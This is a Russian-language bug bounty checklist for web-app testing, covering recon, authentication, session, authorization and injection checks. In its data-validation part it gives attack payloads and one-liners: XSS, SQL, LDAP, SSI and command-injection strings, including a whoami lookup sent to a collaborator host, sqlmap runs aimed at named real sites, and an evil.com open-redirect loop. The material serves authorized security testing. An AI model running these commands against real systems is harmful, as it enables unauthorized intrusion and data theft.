# Контрольный список вознаграждений за обнаруженные ошибки для веб-приложения

[](https://github.com/sehno/Bug-bounty/blob/master/bugbounty_checklist.md#bug-bounty-checklist-for-web-app)

> Этот контрольный список может помочь вам разработать хорошую методологию для охоты за ошибками.  
> Когда вы выполните действие, не забудьте проверить ;)  
> Удачной охоты!


## Разведка на подстановочном домене


- [ ] Беги, amass
- [ ] Запустить subfinder
- [ ] Запустить assetfinder
- [ ] Запустить dnsgen
- [ ] Запустить massdns
- [ ] Использовать httprobe
- [ ] Запустить aquatone (скриншот для живого хоста)

## Единый домен



### Сканирование


- [ ]  Nmap scan
- [ ]  Burp crawler
- [ ]  ffuf (directory and file fuzzing)
- [ ]  hakrawler/gau/paramspider
- [ ]  Linkfinder
- [ ]  Url with Android application

### Ручная проверка


- [ ]  Shodan
- [ ]  Censys
- [ ]  Google dorks
- [ ]  Pastebin
- [ ]  Github
- [ ]  OSINT

### Сбор информации



- [ ] Вручную исследуйте сайт
- [ ] Поиск/сканирование на предмет пропущенного или скрытого контента
- [ ] Проверьте файлы, раскрывающие контент, такие как robots.txt, sitemap.xml, .DS_Store
- [ ] Проверьте кэши основных поисковых систем на наличие общедоступных сайтов.
- [ ] Проверьте наличие различий в контенте на основе User Agent (например, мобильные сайты, доступ в качестве поискового робота)
- [ ] Выполнение отпечатков веб-приложений
- [ ] Определить используемые технологии
- [ ] Определите роли пользователей
- [ ] Определите точки входа приложения
- [ ] Определить клиентский код
- [ ] Определите несколько версий/каналов (например, веб, мобильный веб, мобильное приложение, веб-сервисы)
- [ ] Определите совместно размещенные и связанные приложения
- [ ] Определите все имена хостов и порты
- [ ] Определите сторонний размещенный контент
- [ ] Определить параметры отладки

### Управление конфигурацией



- [ ] Проверьте наличие часто используемых URL-адресов приложений и административных адресов.
- [ ] Проверьте наличие старых, резервных и неиспользуемых файлов
- [ ] Проверьте поддерживаемые методы HTTP и межсайтовую трассировку (XST)
- [ ] Тестовая обработка расширений файлов
- [ ] Тестирование заголовков HTTP безопасности (например, CSP, X-Frame-Options, HSTS)
- [ ] Тестирование политик (например, Flash, Silverlight, роботы)
- [ ] Тестирование непроизводственных данных в реальной среде и наоборот
- [ ] Проверка наличия конфиденциальных данных в клиентском коде (например, ключей API, учетных данных)

### Безопасная передача



- [ ] Проверьте версию SSL, алгоритмы, длину ключа
- [ ] Проверка действительности цифрового сертификата (срок действия, подпись и CN)
- [ ] Проверьте учетные данные, доставленные только по HTTPS
- [ ] Убедитесь, что форма входа доставляется по протоколу HTTPS.
- [ ] Проверьте токены сеанса, доставленные только по HTTPS
- [ ] Проверьте, используется ли HTTP Strict Transport Security (HSTS)

### Аутентификация



- [ ] Тест на подсчет пользователей
- [ ] Тест на обход аутентификации
- [ ] Тест на защиту от перебора
- [ ] Правила проверки качества пароля
- [ ] Тест функциональности «Запомнить меня»
- [ ] Тест автозаполнения форм/ввода пароля
- [ ] Тестовый сброс и/или восстановление пароля
- [ ] Тестовый процесс смены пароля
- [ ] Тест CAPTCHA
- [ ] Тестовая многофакторная аутентификация
- [ ] Тест на наличие функции выхода из системы
- [ ] Тест управления кэшем по HTTP (например, Pragma, Expires, Max-age)
- [ ] Тест на логины по умолчанию
- [ ] Тест на доступность истории аутентификации для пользователя
- [ ] Тестирование внеканальных уведомлений о блокировках учетных записей и успешных сменах паролей.
- [ ] Тестирование единообразной аутентификации в приложениях с общей схемой аутентификации/SSO

### Управление сеансом



- [ ] Установите, как осуществляется управление сеансами в приложении (например, токены в файлах cookie, токен в URL)
- [ ] Проверка токенов сеанса на наличие флагов cookie (только http и безопасно)
- [ ] Проверьте область действия сеансового cookie-файла (путь и домен)
- [ ] Проверьте длительность сеанса cookie (срок действия и максимальный возраст)
- [ ] Проверить завершение сеанса после максимального срока службы
- [ ] Проверить завершение сеанса после относительного тайм-аута
- [ ] Проверить завершение сеанса после выхода из системы
- [ ] Проверьте, могут ли пользователи иметь несколько одновременных сеансов.
- [ ] Тестирование сеансовых куки-файлов на случайность
- [ ] Подтвердите, что новые токены сеанса выдаются при входе в систему, смене роли и выходе из системы.
- [ ] Тестирование согласованного управления сеансами в приложениях с помощью общего управления сеансами.
- [ ] Тест на головоломку сеанса
- [ ] Тест на CSRF и кликджекинг

### Авторизация


- [ ] Тест на прохождение пути
- [ ] Тест на обход схемы авторизации
- [ ] Тест на наличие проблем с вертикальным контролем доступа (также известный как повышение привилегий)
- [ ] Тест на наличие проблем с горизонтальным контролем доступа (между двумя пользователями с одинаковым уровнем привилегий)
- [ ] Тест на отсутствие авторизации

### Проверка данных



- [ ] Тест на наличие отраженного XSS
- [ ] Тест на наличие сохраненного XSS
- [ ] Тест на XSS на основе DOM
```
 '\"`><img src=x>THE HACKER WAS HERE${{7'*7'}}
```

```
- Paramspider :-
    
- python3 paramspider.py --domain indrive.com
    
- python3 paramspider.py --domain [https://cpcalendars.cartscity.com](https://cpcalendars.cartscity.com/) --exclude woff,css,js,png,svg,php,jpg --output g.txt
    
- cat indrive.txt | kxss  ( looking for reflected :-  "<> )
```


- [ ] Тест на перекрестное мигание
- [ ] Тест на HTML-инъекцию
- [ ] Тест на SQL-инъекцию

```
- echo [https://www.recreation.gov](https://www.recreation.gov/) | waybackurls | grep "?" | uro | httpx -silent > param.txt
    
- cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > param.txt
    
- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
    
- sqlmap -u [https://my.easyname.at/en/login](https://my.easyname.at/en/login) --dbs --forms --crawl=2
```

 SQLi One Linear :
```

[](https://github.com/WadQamar10/My-Hunting-Methodology-/blob/main/My%20Bug%20Hunting%20Methodology.md#sqli-one-linear--)

- cat target.com | waybackurls | grep "?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
    
- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
```

- [ ] Тест на инъекцию LDAP
возникает, когда пользовательский ввод используется в LDAP-запросах без должной фильтрации
```
*)(|(objectClass=*))
```
**Тестирование на входе**: Если есть форма входа, попробуйте:
```
username: admin)(|(password=*))
password: anything

```

- [ ] Тест на инъекцию ОRМ
```
' OR 1=1 -- 
```

- [ ] Тест на XML-инъекцию
- [ ] Тест на инъекцию XXE


_Советы_

- Для каждого XML-входа, который вы видите, попробуйте XXE
- Для каждой загрузки документа попробуйте загрузить файл docx. Они также могут быть уязвимы для XXE.
- Для каждой загрузки изображения попробуйте загрузить SVG, вы также можете сделать XXE через SVG.



- [ ] Тест на инъекцию SSI
```
<!--#exec cmd="ls"-->
```

- [ ] Тест на XPath-инъекцию
```
' or '1'='1
```

- [ ] Тест на внедрение XQuery
```
Попробуйте внедрить выражения XQuery в запросы.
```

- [ ] Тест на IMAP/SMTP-инъекцию
```
Введите специальные символы для манипуляции командой, например, `rcpt to:`
```

- [ ] Тест на инъекцию команды
- [ ] Тест на внедрение кода
```
||sleep+10+%23||     pwd      ´pwd´      `pwd`   # pwd #    ;pwd #
```

```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

 Php injection
```
 '; phpinfo();//
```


- [ ] Тест на SSTI
- [ ] Тест на внедрение языка выражений

```
${{<%[%'"}}%\.

FOR Testing SSTI and tplmap tool :-

- git clone [https://github.com/epinna/tplmap.git](https://github.com/epinna/tplmap.git)
    
- ./tplmap.py -u "domain.com/?parameter=SSTI*"
    

---

- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
    
- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json
    

---

######## Testing for xss and sqli at the same time >_< ##############

- cat subdomains.txt | waybackurls | uro | grep "?" | httpx -silent > param.txt
    
- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
    
- cat param.txt | kxss
```


- [ ] 1
- [ ] Тест на HTTP-разделение/контрабанду
- [ ] Тест на подделку HTTP-глаголов
- [ ] Тест на открытое перенаправление (Open Redirect)

Open Redirection OneLiner :

```
- waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
    
- httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

- [ ] Тест на включение локального файла
- [ ] Тест на включение удаленного файла

_Советы_

- Если файл или изображение загружается с локального диска, попробуйте LFI/RFI (пример file=test.jpg)
- Держите VPS под рукой на случай, если вам понадобится сделать запрос информации

- [ ] Сравните правила проверки на стороне клиента и на стороне сервера
- [ ] Тест на NoSQL-инъекцию
- [ ] Тест на загрязнение HTTP-параметров

- можно обойти фильтр если добавить точно такой же аргумент но другое значение
```
https://twitter.com/i/u?iid=F6542&uid=2321301342&uid=1134885524&nid=22+26    (два UID)
```

- [ ] Тест на автоматическое связывание (IDOR)

```
--------
GET api/1234/../1235/profile     - IDOR второго порядка
--------
если GET api/me/profile то попробывать GET api/1235/profile
--------
GET api/v2/1235/profile - 403  всегда стоит посмотреть другие версии api
GET api/v1/1235/profile - 200
--------
GET api/v1/?profile=1234&?profile=1235      есть шанс что сервер не правильно обработает запрос 
--------
IN Json:
Опять же, в зависимости от того, как обрабатываются наши входные данные, мы можем ввести нежелательное поведение, заменив наш идентификатор на:

массив идентификаторов: [1234, 1235]
логическое значение: true/false (будьте внимательны при тестировании)
подстановочный знак, такой как звездочка (*) или знак процента (%) (опять же, будьте осторожны при тестировании)
большое целочисленное значение, добавив нули перед нашим идентификатором: 00001235
отрицательный идентификатор: -1
десятичное число: 1235.0
строковое значение с добавленным разделителем: "1234,1235"
```

```
Open Redirection OneLiner :-

- waybackurls tesorion.nl | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep "evil.com" && echo "$host \033[0;31mVulnerable\n" ;done
    
- httpx -l i.txt -path "///evil.com" -status-code -mc 302
```

- [ ] Тест на массовое назначение

**Массовое назначение** (или **mass assignment**) происходит, когда приложение позволяет устанавливать значения полей, которые не должны быть доступны пользователю. Это может произойти, если не используется фильтрация параметров, что может привести к уязвимостям.

- [ ] Тест на наличие NULL/недействительного сеансового cookie-файла

```
Set-Cookie: sessionId=NULL
```




### Отказ в обслуживании


- [ ] Тест на антиавтоматизацию
- [ ] Тест на блокировку аккаунта
- [ ] Тест на DoS-атаку протокола HTTP
- [ ] Тест на DoS-атаки с использованием подстановочных знаков SQL

### Бизнес-логика



- [ ] Тест на неправильное использование функций
- [ ] Тест на отсутствие неотказуемости
- [ ] Тест на доверительные отношения
- [ ] Проверка целостности данных
- [ ] Тестовое разделение обязанностей

### Криптография


- [ ] Проверьте, не зашифрованы ли данные, которые должны быть зашифрованы.
- [ ] Проверка на наличие неправильных алгоритмов использования в зависимости от контекста
- [ ] Проверьте использование слабых алгоритмов
- [ ] Проверьте правильность использования соления.
- [ ] Проверка функций случайности

### Рискованная функциональность — загрузка файлов


- [ ] Проверьте, что допустимые типы файлов занесены в белый список.
- [ ] Проверьте, что ограничения на размер файла, частоту загрузки и общее количество файлов определены и соблюдаются.
- [ ] Проверьте, что содержимое файла соответствует определенному типу файла.
- [ ] Проверьте, что все загружаемые файлы проходят антивирусную проверку.
- [ ] Проверьте, что небезопасные имена файлов очищены
- [ ] Проверьте, что загруженные файлы не доступны напрямую в корневом каталоге веб-сайта.
- [ ] Проверьте, что загруженные файлы не обслуживаются на том же хосте/порту
- [ ] Проверьте, что файлы и другие носители интегрированы со схемами аутентификации и авторизации.

### Рискованная функциональность — оплата картой



- [ ] Тестирование известных уязвимостей и проблем конфигурации веб-сервера и веб-приложения.
- [ ] Проверка пароля по умолчанию или угадываемого пароля
- [ ] Тестирование непроизводственных данных в реальной среде и наоборот
- [ ] Тест на уязвимости к инъекциям
- [ ] Тест на переполнение буфера
- [ ] Тест на небезопасность криптографического хранилища
- [ ] Тест на недостаточную защиту транспортного уровня
- [ ] Тест на неправильную обработку ошибок
- [ ] Тест на все уязвимости с оценкой CVSS v2 > 4.0
- [ ] Тест на наличие проблем аутентификации и авторизации
- [ ] Тест на CSRF

### HTML5


- [ ] Тестирование веб-сообщений
- [ ] Тест на наличие SQL-инъекции в веб-хранилище
- [ ] Проверить реализацию CORS

```
[https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)

pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

---

[https://github.com/Tanmay-N/CORS-Scanner](https://github.com/Tanmay-N/CORS-Scanner)

go install github.com/Tanmay-N/CORS-Scanner@latest

cat CORS-domain.txt | CORS-Scanner
```

- [ ] Проверить автономное веб-приложение
